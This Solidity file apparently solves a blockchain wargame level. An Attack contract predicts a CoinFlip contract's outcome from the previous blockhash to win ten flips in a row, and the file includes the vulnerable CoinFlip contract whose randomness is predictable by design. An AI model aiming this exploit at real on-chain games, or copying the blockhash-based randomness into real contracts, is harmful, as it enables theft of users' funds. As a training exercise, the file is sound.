// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Attack{
    CoinFlip cf = CoinFlip(0x902890806f37b8A8DB2d2D5F1b3E2fd4016eA2bc);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // run this 10 times since level asks us to reach 10 consecutive wins
    // we dont run this in a loop due to line 34
    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        cf.flip(side);
    }
    
}

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}